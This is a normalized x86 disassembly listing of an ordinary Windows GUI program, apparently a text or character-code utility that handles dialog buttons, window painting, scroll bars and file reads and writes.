call sub_40b700
cmp [ edi ] 0x0
jne r-xdata
movzx eax al
push ebx
push eax
mov ecx esi
call sub_4020f0
test eax eax
jne r-xdata
push ebx
push 0x0
mov ecx esi
call sub_4020f0
mov ecx [ esi + 0x218 ]
mov [ esi + ecx * 2 + 0x224 ] 0x5b
mov edx [ esi + 0x218 ]
inc edx
mov [ esi + 0x218 ] edx
mov ecx edx
mov [ esi + ecx * 2 + 0x224 ] ax
mov ecx [ esi + 0x218 ]
inc ecx
mov eax ecx
mov [ esi + 0x218 ] ecx
mov [ esi + eax * 2 + 0x224 ] 0x5d
pop ebp
pop ebx
pop edi
pop esi
retn 0x8
mov al [ edi ]
cmp al 0x2f
jne r-xdata
movzx eax al
xor edx edx
mov dh al
mov eax [ esi + 0x218 ]
inc edi
mov dl [ edi ]
and edx 0x7f7f
mov [ esi + eax * 2 + 0x224 ] dx
mov ecx [ esi + 0x218 ]
mov [ esi + ecx * 2 + 0x224 ] 0x213f
jmp r-xdata
mov eax [ esi + 0x218 ]
inc eax
inc edi
mov [ esi + 0x218 ] eax
mov al [ edi ]
cmp al 0xa
jne r-xdata
sub_402400
mov ecx [ esp + 0x4 ]
mov ax [ ecx ]
mov edx [ esp + 0x8 ]
push esi
push edi
xor esi esi
xor edi edi
cmp ax [ edx ]
jne r-xdata
mov ax [ ecx ]
test ax ax
je r-xdata
mov ax [ ecx + 0x2 ]
add ecx 0x2
add edx 0x2
cmp ax 0x5b
je r-xdata
mov dx [ edx ]
cmp dx [ ecx ]
pop edi
sbb eax eax
neg eax
pop esi
retn
mov si [ edx ]
test si si
je r-xdata
movzx edi ax
add ecx 0x2
cmp ax 0x28
je r-xdata
cmp ax si
jne r-xdata
movzx esi ax
add edx 0x2
cmp ax 0x28
je r-xdata
cmp ax 0x7b
je r-xdata
add ecx 0x2
xor eax eax
mov ax [ ecx ]
add edx 0x2
test ax ax
jne r-xdata
cmp ax [ edx ]
je r-xdata
cmp edi esi
jne r-xdata
cmp ax 0x7b
je r-xdata
cmp ax 0x5d
je r-xdata
xor eax eax
cmp esi edi
pop edi
setl al
pop esi
retn
cmp ax 0x5d
je r-xdata
cmp ax 0x29
je r-xdata
cmp ax 0x29
je r-xdata
cmp ax 0x7d
jne r-xdata
cmp ax 0x7d
jne r-xdata
mov ax [ edx ]
cmp ax 0x5b
je r-xdata
mov ax [ ecx ]
cmp ax 0x222a
jne r-xdata
sub_4024d0
mov eax [ esp + 0x4 ]
push esi
push eax
mov esi ecx
call sub_41a060
xor eax eax
mov [ esi + 0x44 ] eax
mov [ esi + 0x50 ] eax
mov [ esi + 0x4c ] eax
mov [ esi + 0x40 ] eax
mov [ esi + 0x3c ] eax
mov [ esi ] r--data
mov eax esi
pop esi
retn 0x4
sub_402500
push esi
mov esi ecx
mov eax [ esi + 0x40 ]
push eax
mov [ esi ] r--data
call [ CloseHandle@IAT ]
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
mov eax [ esi + 0x50 ]
test eax eax
je r-xdata
push eax
call sub_429931
add esp 0x4
mov eax [ esi + 0x4c ]
test eax eax
je r-xdata
push eax
call sub_429931
add esp 0x4
mov ecx esi
pop esi
jmp sub_4198b0
push eax
call sub_429931
add esp 0x4
sub_402550
sub esp 0x10
push esi
push edi
mov edi [ esp + 0x1c ]
test edi edi
mov esi ecx
jne r-xdata
mov ecx [ rw-data ]
xor eax eax
mov ax [ rw-data ]
shl ax 0x1
add eax ecx
mov [ esi + 0xc ] ax
mov al [ rw-data ]
test al al
je r-xdata
mov edi [ esi + 0x8 ]
test edi edi
je r-xdata
movzx ecx [ rw-data ]
push ecx
push 0x0
push edi
call [ ShowScrollBar@IAT ]
mov eax [ rw-data ]
lea edx [ esp + 0x8 ]
push edx
push eax
call [ GetClientRect@IAT ]
mov al [ rw-data ]
test al al
push 0x1
je r-xdata
push 0x3
call [ GetSystemMetrics@IAT ]
add [ esi + 0xc ] ax
pop edi
pop esi
add esp 0x10
retn 0x4
movsx eax [ esi + 0xc ]
mov ecx [ esp + 0x14 ]
movsx edx [ rw-data ]
add ecx 0x2
push eax
push ecx
mov ecx [ esp + 0x20 ]
sub ecx edx
sub ecx eax
add ecx 0x2
push ecx
movsx ecx [ esi + 0xc ]
mov edx [ esp + 0x14 ]
movsx eax [ rw-data ]
push ecx
add edx 0x2
push edx
push eax
jmp r-xdata
push 0xffffffff
push edi
call [ MoveWindow@IAT ]
push edi
mov ecx esi
call sub_419b90
sub_402640
mov eax [ esp + 0x4 ]
test eax eax
push esi
mov esi ecx
jne r-xdata
movsx edx [ esi + 0x1e ]
push edx
call sub_4199d0
movsx ecx [ esi + 0x1e ]
cmp eax ecx
jne r-xdata
movsx eax [ esi + 0x1e ]
push eax
call sub_419970
movsx ecx [ esi + 0x1e ]
cmp eax ecx
jne r-xdata
mov edx [ esi ]
push eax
mov ecx esi
call [ edx ]
pop esi
retn 0x4
mov ecx esi
call sub_419fc0
mov edx [ esi ]
xor eax eax
push eax
mov ecx esi
call [ edx ]
pop esi
retn 0x4
sub_402690
push ecx
push ebx
mov ebx ecx
mov al [ ebx + 0x5a ]
test al al
je r-xdata
pop ebx
pop ecx
retn
mov eax [ ebx + 0x4c ]
test eax eax
je r-xdata
push esi
movsx esi [ rw-data ]
push edi
push 0x1
push 0x3
push r--data
mov ecx rw-data
shl esi 0x3
call sub_425b30
mov edi eax
cmp edi 0xffffffff
je r-xdata
mov al [ rw-data ]
test al al
jne r-xdata
mov ecx [ ebx + 0x4c ]
push 0x0
lea eax [ esp + 0x10 ]
push eax
push esi
push ecx
push edi
call [ WriteFile@IAT ]
test eax eax
jne r-xdata
push edi
call [ CloseHandle@IAT ]
pop edi
pop esi
mov edx [ rw-data ]
push edx
push 0x8
push 0x1
call sub_421530
add esp 0xc
sub_402710
push ecx
push ebp
push esi
push edi
xor ebp ebp
push ebp
mov esi ecx
mov [ esp + 0x10 ] ebp
call sub_419970
mov edi eax
test edi edi
je r-xdata
pop edi
pop esi
pop ebp
pop ecx
retn
push ebx
lea ecx [ ecx ]
push ebp
mov ecx esi
call sub_419970
mov ebp eax
push ebp
mov ecx esi
mov [ esp + 0x14 ] ebp
call sub_419970
mov edi eax
cmp ebp edi
jne r-xdata
push edi
mov ecx esi
call sub_419930
xor ebx ebx
test eax eax
jle r-xdata
push edi
mov ecx esi
call sub_419970
cmp edi eax
je r-xdata
pop ebx
cmp ebx eax
jne r-xdata
mov ecx [ esi + 0x14 ]
lea edx [ ecx + ebp * 2 ]
lea ecx [ ecx + edi * 2 ]
push edi
mov ecx esi
call sub_419970
mov edi eax
push ebp
mov ecx esi
call sub_419970
lea ecx [ ebx + ebp + 0x1 ]
cmp ecx eax
jne r-xdata
mov ebp [ esp + 0x10 ]
inc ebx
add ecx 0x2
add edx 0x2
cmp ebx eax
jl r-xdata
push edi
mov ecx esi
call sub_419970
movsx edx [ esi + 0x1a ]
mov ebx eax
mov eax [ esi + 0x14 ]
sub edx ebx
lea ecx [ edx + edx + 0x2 ]
push ecx
lea edx [ eax + ebx * 2 ]
push edx
lea eax [ eax + edi * 2 ]
push eax
call sub_429090
mov ecx edi
sub ecx ebx
add esp 0xc
add [ esi + 0x1a ] cx
jmp r-xdata
mov bp [ edx ]
cmp bp [ ecx ]
jne r-xdata
push edi
mov ecx esi
call sub_419970
cmp edi eax
jne r-xdata
sub_402800
push edi
mov edi ecx
mov al [ edi + 0x54 ]
test al al
jne r-xdata
push ebx
push ebp
movsx ebp [ rw-data ]
push esi
xor esi esi
test ebp ebp
jle r-xdata
xor eax eax
pop edi
retn
pop esi
pop ebp
pop ebx
xor eax eax
pop edi
retn
mov ecx [ edi + 0x4c ]
mov edx ecx
cmp eax 0x6
je r-xdata
inc eax
cmp eax 0x6
jl r-xdata
lea eax [ ecx + esi * 8 ]
pop esi
pop ebp
pop ebx
pop edi
retn
inc esi
add edx 0x8
cmp esi ebp
jl r-xdata
mov bl [ edi + eax + 0x54 ]
cmp bl [ edx + eax ]
jne r-xdata
xor eax eax
sub_402850
mov ecx [ ecx + 0x44 ]
mov edx [ esp + 0x8 ]
push esi
mov esi [ esp + 0x8 ]
xor eax eax
lea edx [ ecx + edx * 8 ]
movzx ecx [ edx + eax ]
movzx eax [ eax + esi ]
pop esi
sub eax ecx
retn 0x8
test cl cl
je r-xdata
pop esi
xor eax eax
retn 0x8
inc eax
cmp eax 0x3
jl r-xdata
mov cl [ eax + esi ]
cmp cl [ edx + eax ]
jne r-xdata
sub_402890
push ebx
push ebp
push esi
mov esi [ esp + 0x10 ]
push 0x8
push esi
mov ebx ecx
call sub_429969
mov ebp eax
add esp 0x8
test ebp ebp
je r-xdata
pop esi
pop ebp
pop ebx
retn 0x4
movsx eax [ rw-data ]
cmp esi eax
jge r-xdata
mov esi [ ebx + 0x4c ]
push edi
lea ecx [ eax + eax ]
mov edi ebp
[ edi ] [ esi ]
mov eax [ ebx + 0x4c ]
push eax
call sub_429931
add esp 0x4
mov [ ebx + 0x4c ] ebp
pop edi
mov eax esi
sub_4028e0
sub esp 0x8
push edi
mov edi [ esp + 0x14 ]
test edi edi
mov [ esp + 0x8 ] ecx
mov [ esp + 0x7 ] 0x2a
je r-xdata
mov ecx [ esp + 0x18 ]
call sub_401460
test eax eax
je r-xdata
push edi
call sub_4176b0
add esp 0x4
test eax eax
je r-xdata
pop edi
add esp 0x8
retn 0x10
push ebx
push ebp
push esi
jmp r-xdata
cmp [ eax ] 0x2b
jne r-xdata
mov cl [ eax ]
test cl cl
je r-xdata
mov al [ eax ]
mov [ esp + 0x7 ] al
inc eax
pop esi
pop ebp
pop ebx
mov esi eax
lea esp [ esp ]
mov bl [ eax ]
mov cl [ eax + 0x1 ]
inc eax
cmp cl 0xa
mov ebp eax
je r-xdata
mov cl [ eax + 0x1 ]
inc eax
test cl cl
jne r-xdata
mov ecx [ esp + 0x1c ]
push edi
mov eax esi
call sub_401f90
mov edi eax
add esp 0x4
test edi edi
jle r-xdata
lea ebx [ ebx ]
cmp cl 0x7f
jbe r-xdata
movsx edx [ esp + 0x13 ]
movsx ecx bl
mov ebx [ esp + 0x20 ]
mov eax ebx
call sub_401fd0
test eax eax
je r-xdata
mov ecx [ esp + 0x1c ]
mov edx esi
call sub_402060
test eax eax
je r-xdata
mov cl [ eax + 0x1 ]
inc eax
cmp cl 0xa
jne r-xdata
mov ecx [ esp + 0x24 ]
call sub_401460
test eax eax
jne r-xdata
test edi edi
jne r-xdata
mov eax [ esp + 0x28 ]
test eax eax
jne r-xdata
mov ecx [ esp + 0x14 ]
mov [ ecx + 0x5b ] 0x1
mov edi [ esp + 0x20 ]
lea esp [ esp ]
mov edi [ esp + 0x14 ]
cmp [ edi + 0x1a ] 0x0
je r-xdata
jmp r-xdata
cmp [ ebp ] 0xa
je r-xdata
push 0x2f
mov ecx edi
call sub_419a00
test ebx ebx
je r-xdata
mov esi ebp
lea ecx [ ecx ]
mov ecx [ esp + 0x14 ]
push ebx
call sub_419a00
test ebx ebx
je r-xdata
movzx ecx [ esi + 0x1 ]
xor edx edx
mov dh al
inc esi
mov eax edx
or ecx eax
push ecx
jmp r-xdata
movzx edx [ esi ]
push edx
cmp al 0x2f
jne r-xdata
mov ecx edi
call sub_419a00
mov al [ esi + 0x1 ]
inc esi
cmp al 0xa
jne r-xdata
mov al [ esi ]
test al al
jns r-xdata
push ebx
mov ecx edi
call sub_419a00
sub_402a50
push ecx
push ebp
mov ebp ecx
call sub_40ea20
mov ax [ ebp + 0x5c ]
cmp ax [ ebp + 0x24 ]
jne r-xdata
movsx ecx [ ebp + 0x38 ]
movsx eax ax
sub eax ecx
mov [ esp + 0x4 ] eax
mov [ esp + 0x4 ] 0xffffffff
jmp r-xdata
push ebx
push esi
push edi
mov ecx ebp
call sub_40f040
mov edx [ esp + 0x1c ]
movsx ecx [ ebp + 0x24 ]
mov eax [ esp + 0x18 ]
push edx
mov edx [ ebp + 0x20 ]
push eax
push ecx
mov ecx [ ebp + 0x1c ]
push edx
lea ebx [ ebp + 0x1c ]
push ebp
call sub_421d20
mov eax [ ebx + 0x4 ]
mov cx [ eax ]
add [ ebx + 0x8 ] cx
mov edx [ ebx ]
mov eax [ edx + 0x8 ]
mov [ ebx + 0x4 ] eax
mov esi ebx
lea edi [ ebp + 0x30 ]
mov ecx 0x5
[ edi ] [ esi ]
mov cx [ esp + 0x1c ]
add [ ebp + 0x38 ] cx
mov ax [ ebp + 0x38 ]
mov esi ebx
lea edi [ ebp + 0x54 ]
mov ecx 0x5
[ edi ] [ esi ]
mov ecx [ esp + 0x10 ]
cmp ecx 0xffffffff
pop edi
pop esi
mov [ ebp + 0x44 ] 0x3
pop ebx
je r-xdata
push 0x0
mov ecx ebp
call sub_424aa0
push 0x0
push 0x2
mov ecx ebp
call sub_424dd0
cmp [ ebp + 0x44 ] 0x3
je r-xdata
mov ecx ebp
call sub_4015b0
mov ecx ebp
call sub_40db40
mov ecx ebp
call sub_40f190
pop ebp
pop ecx
retn 0x8
add eax ecx
mov [ ebp + 0x5c ] ax
sub_402b30
mov eax [ esp + 0x8 ]
sub esp 0x40
cmp eax 0x201
ja r-xdata
mov ecx eax
sub ecx 0x204
je r-xdata
je r-xdata
mov eax [ esp + 0x50 ]
cmp eax 0xffffffff
je r-xdata
sub ecx 0x6
je r-xdata
push 0x12
call [ GetKeyState@IAT ]
test ax ax
jl r-xdata
mov ecx eax
dec ecx
je r-xdata
call [ GetFocus@IAT ]
push eax
mov ecx rw-data
call sub_4198d0
xor eax eax
add esp 0x40
retn 0x10
push eax
mov ecx rw-data
call sub_41a0a0
mov eax [ esp + 0x4c ]
push eax
mov ecx rw-data
call sub_419d90
xor eax eax
add esp 0x40
retn 0x10
mov edx [ esp + 0x50 ]
mov ecx [ esp + 0x4c ]
push edx
mov edx [ esp + 0x48 ]
push ecx
push eax
push edx
call [ DefWindowProcA@IAT ]
add esp 0x40
retn 0x10
mov ecx [ esp + 0x50 ]
push ecx
mov ecx rw-data
call sub_41a0a0
xor eax eax
add esp 0x40
retn 0x10
mov eax [ esp + 0x44 ]
push eax
mov ecx rw-data
call sub_402550
xor eax eax
add esp 0x40
retn 0x10
sub ecx 0xe
je r-xdata
push ebx
push esi
push edi
mov edi [ esp + 0x50 ]
lea ecx [ esp + 0xc ]
push ecx
push edi
call [ BeginPaint@IAT ]
mov ebx [ GetSysColor@IAT ]
push 0x8
mov esi eax
call ebx
push eax
push esi
call [ SetTextColor@IAT ]
push 0xf
call ebx
push eax
push esi
call [ SetBkColor@IAT ]
push esi
mov ecx rw-data
call sub_419f30
lea edx [ esp + 0xc ]
push edx
push edi
call [ EndPaint@IAT ]
pop edi
pop esi
pop ebx
xor eax eax
add esp 0x40
retn 0x10
sub ecx 0x105
jne r-xdata
mov eax [ esp + 0x4c ]
push eax
mov ecx rw-data
call sub_419c40
xor eax eax
add esp 0x40
retn 0x10
sub_402c80
push ecx
mov eax [ esp + 0xc ]
sub eax 0x53
push ebx
push ebp
push esi
push edi
mov esi ecx
je r-xdata
mov eax [ esp + 0x18 ]
push 0x407
push eax
call sub_414bc0
add esp 0x8
sub eax 0xbd
je r-xdata
mov eax [ esi + 0x218 ]
test eax eax
je r-xdata
dec eax
jne r-xdata
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
pop ecx
retn 0x10
lea ecx [ esi + 0x224 ]
xor edi edi
cmp [ ecx ] 0x2121
mov [ esp + 0x10 ] ecx
je r-xdata
pop edi
pop esi
pop ebp
xor eax eax
pop ebx
pop ecx
retn 0x10
movzx eax [ esp + 0x20 ]
cmp eax 0x412
jg r-xdata
mov ebx [ esp + 0x18 ]
mov ebp [ SendDlgItemMessageA@IAT ]
lea ecx [ esi + edi * 2 + 0x22a ]
push ecx
sub eax edi
sub eax 0x3
push eax
push 0x408
push 0x411
push ebx
call ebp
mov ax [ esi + edi * 2 + 0x222 ]
cmp ax 0x5d
jne r-xdata
add ecx 0x2
inc edi
cmp [ ecx ] 0x2121
jne r-xdata
sub eax 0x413
je r-xdata
je r-xdata
cmp ax 0x7d
jne r-xdata
push 0x1
push 0x412
push ebx
call [ CheckDlgButton@IAT ]
mov dx [ esi + edi * 2 + 0x220 ]
mov [ esi + edi * 2 + 0x21e ] dx
jmp r-xdata
mov esi [ esp + 0x18 ]
push 0x413
push esi
call [ IsDlgButtonChecked@IAT ]
test eax eax
je r-xdata
dec eax
je r-xdata
mov esi [ esp + 0x18 ]
push 0x412
push esi
call [ IsDlgButtonChecked@IAT ]
test eax eax
je r-xdata
dec eax
je r-xdata
cmp ax 0x29
jne r-xdata
push 0x1
push 0x414
push ebx
call [ CheckDlgButton@IAT ]
mov ax [ esi + edi * 2 + 0x220 ]
mov [ esi + edi * 2 + 0x21e ] ax
jmp r-xdata
sub edi 0x2
push 0x0
push 0x412
mov esi [ esp + 0x18 ]
push 0x414
push esi
call [ IsDlgButtonChecked@IAT ]
test eax eax
je r-xdata
push 0x0
push 0x413
jmp r-xdata
mov ebx [ esp + 0x18 ]
lea ecx [ esp + 0x20 ]
push ecx
push 0x410
push ebx
call sub_402150
lea edx [ esp + 0x28 ]
push edx
push 0x411
push ebx
mov ebp eax
call sub_402150
mov edi eax
xor eax eax
add esp 0x18
cmp ebp eax
je r-xdata
dec eax
je r-xdata
mov edx [ esp + 0x10 ]
push edx
push edi
push 0x408
push 0x410
push ebx
call ebp
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
pop ecx
retn 0x10
push 0x1
push 0x413
push ebx
call [ CheckDlgButton@IAT ]
mov cx [ esi + edi * 2 + 0x220 ]
mov [ esi + edi * 2 + 0x21e ] cx
mov edi [ CheckDlgButton@IAT ]
push 0x0
push 0x413
push esi
call edi
push 0x0
push 0x412
push esi
call edi
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
pop ecx
retn 0x10
mov edi [ CheckDlgButton@IAT ]
push esi
call edi
push 0x0
push 0x414
push esi
call edi
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
pop ecx
retn 0x10
push 0x30
push 0x8a
push 0x8b
push ebx
call sub_420e20
add esp 0x10
xor eax eax
test ebp ebp
setne al
add eax 0x410
push eax
push ebx
call [ GetDlgItem@IAT ]
push eax
call [ SetFocus@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
pop ecx
retn 0x10
cmp edi eax
je r-xdata
mov eax [ esp + 0x18 ]
push 0x0
push eax
call [ EndDialog@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
pop ecx
retn 0x10
sub eax 0x3e5
jne r-xdata
cmp ebp eax
mov [ esi + 0x218 ] eax
jle r-xdata
push 0x412
push ebx
call [ IsDlgButtonChecked@IAT ]
test eax eax
je r-xdata
jmp r-xdata
push 0x413
push ebx
call [ IsDlgButtonChecked@IAT ]
test eax eax
je r-xdata
mov eax [ esp + 0x20 ]
mov edx [ esp + 0x1c ]
xor ecx ecx
mov cx [ eax + ebp * 2 - 0x2 ]
cmp cx [ edx + edi * 2 - 0x2 ]
jne r-xdata
mov ecx [ esp + 0x20 ]
movzx ecx [ ecx + eax * 2 ]
mov edx ecx
and edx 0x7f00
cmp edx 0x2400
jne r-xdata
push 0x414
push ebx
call [ IsDlgButtonChecked@IAT ]
test eax eax
je r-xdata
mov eax [ esp + 0x20 ]
mov ax [ eax + ebp * 2 - 0x2 ]
mov edx [ esp + 0x1c ]
cmp ax [ edx + edi * 2 - 0x2 ]
jne r-xdata
call sub_402080
test eax eax
jne r-xdata
dec edi
push 0x30
push 0x8a
push 0x8c
jmp r-xdata
mov edx [ esi + 0x218 ]
mov [ esi + edx * 2 + 0x224 ] cx
mov ecx [ esi + 0x218 ]
inc ecx
inc eax
cmp eax ebp
mov [ esi + 0x218 ] ecx
jl r-xdata
mov edx [ esi + 0x218 ]
mov [ esi + edx * 2 + 0x224 ] 0x2121
mov ecx [ esi + 0x218 ]
inc ecx
mov [ esi + 0x218 ] ecx
mov eax ecx
mov [ esi + eax * 2 + 0x224 ] 0x222a
mov eax [ esi + 0x218 ]
inc eax
mov [ esi + 0x218 ] eax
mov [ esi + eax * 2 + 0x224 ] 0x2121
mov ebp [ esi + 0x218 ]
inc ebp
xor eax eax
test edi edi
mov [ esi + 0x218 ] ebp
mov ecx ebp
jle r-xdata
mov ecx [ esp + 0x20 ]
mov ax [ ecx + ebp * 2 - 0x2 ]
mov edx [ esp + 0x1c ]
cmp ax [ edx + edi * 2 - 0x2 ]
jne r-xdata
cmp ax 0x246b
jne r-xdata
dec edi
mov eax [ esi + 0x218 ]
mov cx [ esi + eax * 2 + 0x222 ]
mov [ esi + eax * 2 + 0x224 ] cx
mov edx [ esi + 0x218 ]
inc edx
mov [ esi + 0x218 ] edx
mov eax edx
mov [ esi + eax * 2 + 0x220 ] 0x5b
mov edx [ esi + 0x218 ]
mov [ esi + edx * 2 + 0x224 ] 0x5d
inc [ esi + 0x218 ]
xor ecx ecx
test edi edi
jle r-xdata
push 0x30
push 0x8a
push 0x8d
jmp r-xdata
push ebx
call sub_420e20
add esp 0x10
push 0x410
push ebx
call [ GetDlgItem@IAT ]
push eax
call [ SetFocus@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
pop ecx
retn 0x10
push 0x1
push ebx
call [ EndDialog@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
pop ecx
retn 0x10
jmp r-xdata
cmp ax 0x2424
jne r-xdata
dec edi
push 0x30
push 0x8a
push 0x93
jmp r-xdata
mov ecx [ esi + 0x218 ]
dec ecx
mov [ esi + 0x218 ] ecx
mov ebx ecx
xor ecx ecx
test edi edi
jle r-xdata
mov edx [ esp + 0x1c ]
jmp r-xdata
mov edx [ esp + 0x1c ]
mov dx [ edx + eax * 2 ]
mov [ esi + ecx * 2 + 0x224 ] dx
mov ecx [ esi + 0x218 ]
inc ecx
inc eax
cmp eax edi
mov [ esi + 0x218 ] ecx
jl r-xdata
push 0x30
push 0x8a
push 0x94
mov ecx [ esi + 0x218 ]
dec ecx
mov [ esi + 0x218 ] ecx
mov ebx ecx
xor ecx ecx
test edi edi
jle r-xdata
mov [ esi + ebx * 2 + 0x224 ] 0x28
mov edx [ esi + 0x218 ]
mov ebx [ esp + 0x18 ]
inc edx
mov [ esi + 0x218 ] edx
mov eax edx
mov [ esi + eax * 2 + 0x224 ] 0x246b
mov ecx [ esi + 0x218 ]
inc ecx
mov [ esi + 0x218 ] ecx
mov eax ecx
mov [ esi + eax * 2 + 0x224 ] 0x29
inc [ esi + 0x218 ]
jmp r-xdata
mov ax [ edx + ecx * 2 ]
cmp ax 0x213f
je r-xdata
mov [ esi + ebx * 2 + 0x224 ] 0x7b
mov edx [ esi + 0x218 ]
mov ebx [ esp + 0x18 ]
inc edx
mov [ esi + 0x218 ] edx
mov eax edx
mov [ esi + eax * 2 + 0x224 ] 0x2424
mov ecx [ esi + 0x218 ]
inc ecx
mov [ esi + 0x218 ] ecx
mov eax ecx
mov [ esi + eax * 2 + 0x224 ] 0x7d
inc [ esi + 0x218 ]
jmp r-xdata
mov ax [ edx + ecx * 2 ]
cmp ax 0x213f
je r-xdata
push 0x30
push 0x8a
push 0x8e
push ebx
call sub_420e20
add esp 0x10
push 0x411
push ebx
call [ GetDlgItem@IAT ]
push eax
call [ SetFocus@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
pop ecx
retn 0x10
cmp ax 0x2f
je r-xdata
mov ax [ edx + ecx * 2 ]
cmp ax 0x213f
je r-xdata
mov esi [ esp + 0x18 ]
push 0x30
push 0x8a
push 0x8e
push esi
call sub_420e20
add esp 0x10
push 0x411
push esi
call [ GetDlgItem@IAT ]
push eax
call [ SetFocus@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
pop ecx
retn 0x10
cmp ax 0x2f
je r-xdata
inc ecx
cmp ecx edi
jl r-xdata
mov esi [ esp + 0x18 ]
push 0x30
push 0x8a
push 0x8e
push esi
call sub_420e20
add esp 0x10
push 0x411
push esi
call [ GetDlgItem@IAT ]
push eax
call [ SetFocus@IAT ]
pop edi
pop esi
pop ebp
mov eax 0x1
pop ebx
pop ecx
retn 0x10
cmp ax 0x2f
je r-xdata
inc ecx
cmp ecx edi
jl r-xdata
inc ecx
cmp ecx edi
jl r-xdata
sub_403320
sub esp 0x8
push ebx
mov ebx ecx
call sub_40aad0
push eax
push 0x1
call sub_429969
add esp 0x8
test eax eax
mov [ esp + 0x8 ] eax
jne r-xdata
mov ecx [ ebx + 0xc ]
cmp [ ecx ] 0x0
push esi
mov esi eax
mov [ esp + 0x8 ] 0x0
jle r-xdata
mov eax [ ebx + 0x214 ]
push eax
call sub_420ef0
add esp 0x4
xor eax eax
pop ebx
add esp 0x8
retn
pop esi
pop ebx
add esp 0x8
retn
push ebp
push edi
lea ebp [ ebx + 0x224 ]
movzx eax [ ebx + edi * 2 + 0x224 ]
cmp eax 0x28
je r-xdata
mov edx ebp
mov ecx ebp
lea esp [ esp ]
mov [ esi ] 0x31
cmp eax 0x5b
je r-xdata
cmp ax 0x28
je r-xdata
mov eax [ esp + 0x10 ]
mov [ esi ] 0xa
mov ecx [ ebx + 0xc ]
push eax
inc esi
call sub_40a490
mov ecx [ ebx + 0xc ]
cmp eax [ ecx ]
mov [ esp + 0x10 ] eax
jl r-xdata
lea ecx [ ebx + edi * 2 + 0x224 ]
mov cx [ ebx + edi * 2 + 0x226 ]
call sub_402080
mov [ esi ] al
jmp r-xdata
cmp eax 0x7b
je r-xdata
cmp ax 0x7b
je r-xdata
mov edx [ esp + 0x10 ]
mov ecx [ ebx + 0xc ]
push edx
push ebp
call sub_40aea0
mov [ ebx + 0x218 ] eax
xor eax eax
mov ax [ ebp ]
xor edi edi
cmp ax 0x2121
je r-xdata
mov eax [ esp + 0x14 ]
pop edi
pop ebp
mov [ esi ] 0x2f
cmp ax 0x2f
je r-xdata
inc esi
add edi 0x3
mov [ esi ] 0x69
jmp r-xdata
mov [ esi ] 0x2a
inc esi
jmp r-xdata
mov al [ edx ]
or al 0x80
add ecx 0x2
mov [ esi ] al
mov ax [ ecx ]
inc esi
inc edi
cmp ax 0x2121
mov edx ecx
jne r-xdata
mov ax [ ecx ]
cmp ax 0x213f
je r-xdata
mov al ah
or al 0x80
mov [ esi ] al
mov dl [ ecx ]
inc esi
or dl 0x80
mov [ esi ] dl
jmp r-xdata
mov eax [ ebx + 0x218 ]
add edi 0x3
cmp edi eax
jge r-xdata
cmp ax 0x5b
je r-xdata
mov eax [ ebx + 0x218 ]
inc esi
inc edi
add ecx 0x2
cmp edi eax
jl r-xdata
sub_403480
push ecx
push esi
push edi
mov edi ecx
mov eax [ edi + 0x50 ]
test eax eax
je r-xdata
mov ecx [ rw-data ]
call sub_403320
push 0x1
push 0x3
push r--data
mov ecx rw-data
mov [ edi + 0x50 ] eax
call sub_425b30
mov esi eax
cmp esi 0xffffffff
jne r-xdata
push eax
call sub_429931
add esp 0x4
mov edi [ edi + 0x50 ]
mov eax edi
lea edx [ eax + 0x1 ]
mov al [ rw-data ]
test al al
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
push 0x0
sub eax edx
lea edx [ esp + 0xc ]
push edx
push eax
push edi
push esi
call [ WriteFile@IAT ]
push esi
call [ CloseHandle@IAT ]
pop edi
xor eax eax
pop esi
pop ecx
retn
mov eax [ rw-data ]
mov ecx [ rw-data ]
push eax
push 0x90
push ecx
call sub_409fd0
add esp 0xc
pop edi
mov eax 0x1
pop esi
pop ecx
retn
sub_403520
push ebx
push ebp
push esi
push edi
mov ebx ecx
movsx edi [ ebx + 0x48 ]
xor ebp ebp
dec edi
mov eax edi
cdq
sub eax edx
mov esi eax
mov eax [ esp + 0x14 ]
sar esi 0x1
push esi
push eax
call sub_402850
test eax eax
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x4
lea ecx [ edi - 0x1 ]
cmp ebp ecx
jge r-xdata
mov eax [ esp + 0x14 ]
push edi
push eax
mov ecx ebx
call sub_402850
test eax eax
mov eax edi
je r-xdata
test eax eax
jle r-xdata
pop edi
pop esi
pop ebp
pop ebx
retn 0x4
mov eax ebp
mov edi esi
mov ebp esi
jmp r-xdata
lea eax [ edi + ebp ]
cdq
sub eax edx
mov edx [ esp + 0x14 ]
mov esi eax
sar esi 0x1
push esi
push edx
mov ecx ebx
call sub_402850
test eax eax
jne r-xdata
sub_4035a0
sub esp 0x8
push ebp
mov ebp ecx
mov eax [ ebp + 0x14 ]
test eax eax
je r-xdata
mov eax 0x1
pop ebp
add esp 0x8
retn 0x4
push 0x0
push 0x0
push r--data
mov ecx rw-data
call sub_425b30
cmp eax 0xffffffff
mov [ ebp + 0x40 ] eax
jne r-xdata
push ebx
push esi
push edi
push 0x0
push 0x0
push r--data
mov ecx rw-data
mov [ esp + 0x1c ] 0x0
call sub_425b30
mov esi eax
cmp esi 0xffffffff
jne r-xdata
mov ebx [ GetFileSize@IAT ]
push 0x0
push esi
call ebx
push 0x0
push 0x0
push 0x0
push esi
mov edi eax
call [ SetFilePointer@IAT ]
mov eax edi
shr eax 0x3
push edi
mov [ ebp + 0x48 ] ax
call sub_429a56
add esp 0x4
test eax eax
mov [ ebp + 0x44 ] eax
je r-xdata
pop edi
pop esi
pop ebx
mov eax 0x1
pop ebp
add esp 0x8
retn 0x4
mov edi 0x1
jmp r-xdata
push 0x0
lea ecx [ esp + 0x18 ]
push ecx
push edi
push eax
push esi
call [ ReadFile@IAT ]
test eax eax
jne r-xdata
push esi
call [ CloseHandle@IAT ]
test edi edi
jne r-xdata
mov edi [ esp + 0x10 ]
push 0x1
push edi
push r--data
mov ecx rw-data
mov [ esp + 0x1c ] edi
call sub_425b30
mov esi eax
